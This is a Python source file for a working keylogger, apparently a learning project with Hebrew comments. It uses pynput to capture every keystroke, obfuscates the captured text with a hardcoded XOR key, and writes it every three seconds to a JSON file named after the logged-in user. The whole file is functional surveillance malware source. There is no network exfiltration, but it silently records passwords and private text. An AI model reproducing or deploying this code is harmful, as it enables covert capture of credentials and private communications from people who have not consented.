import threading
from pynput import keyboard
from datetime import datetime
import json
import os
from flask import jsonify
import time



class IKeylogger:
    def __init__(self):
        self.my_list = []
        self.listener = None

    def on_press(self, key):
        try:
            tempKey = str(key.char)
        except AttributeError:
            if key == keyboard.Key.backspace:
                if self.my_list:
                    self.my_list.pop()
                return
            elif key == keyboard.Key.enter:
                tempKey = '\n'
            elif key == keyboard.Key.space:
                tempKey = ' '
            else:
                tempKey = str(key)
        self.my_list.append(tempKey)


    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()

    def get_logged_keys(self):
        keys = "".join(self.my_list)
        self.my_list = []
        return keys



class AddToFile():
    def __init__(self):
        self.timestamps = []

    def create_file(self, combined_keys):
        if not combined_keys:
            return

        filename = os.getlogin() + ".json"
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        entry = {timestamp: combined_keys}

        if os.path.exists(filename):
            with open(filename, "r") as f:
                try:
                    data = json.load(f)
                except json.JSONDecodeError:
                    data = {}
        else:
            # אם אין קובץ – ניצור אותו ריק
            data = {}
            with open(filename, "w") as f:
                json.dump(data, f)

        data.update(entry)

        with open(filename, "w") as f:
            json.dump(data, f)


    def xor_encrypt(self, text, key):
        return ''.join(f"{ord(c) ^ ord(key[i % len(key)]):02x}"
                       for i, c in enumerate(text))

class Manager:
    def __init__(self):
        self.keylogger = IKeylogger()
        self.add = AddToFile()

    def run(self):
        self.keylogger.start_logging()
        while True:
            time.sleep(3)
            keys = self.keylogger.get_logged_keys()
            data = self.add.xor_encrypt(keys,"01234567891")
            self.add.create_file(data)
            print(data)
            if keys == "Key.ctrl_l": # ctrl+c עוצר את התוכנה אחרי שהוקלד
                self.keylogger.stop_logging()
                break




Manager().run()
